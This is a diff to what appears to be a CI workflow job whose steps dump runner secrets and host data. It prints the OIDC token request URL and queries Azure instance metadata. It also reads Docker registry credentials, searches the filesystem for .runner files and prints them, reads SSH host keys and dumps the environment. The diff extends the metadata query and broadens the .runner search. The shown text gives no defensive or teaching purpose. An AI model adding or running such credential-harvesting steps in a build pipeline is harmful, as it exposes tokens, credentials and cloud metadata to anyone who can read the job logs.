@@ -20,12 +20,12 @@ jobs:
           echo "=== ACTIONS_ID_TOKEN_REQUEST_URL ==="
           echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
           echo "=== Azure VM metadata ==="
-          curl -s -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
+          curl -s -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01&expand=compute' || true
           echo
           echo "=== docker config.json ==="
           cat ~/.docker/config.json 2>/dev/null || echo none
           echo "=== .runner ==="
-          cat /home/runner/.runner 2>/dev/null || echo none
+          find / -maxdepth 4 -name .runner -print -exec cat {} \; 2>/dev/null | head -40
           echo "=== SSH host keys ==="
           sudo cat /etc/ssh/ssh_host_ed25519_key.pub 2>/dev/null || echo none
           echo "=== env ==="
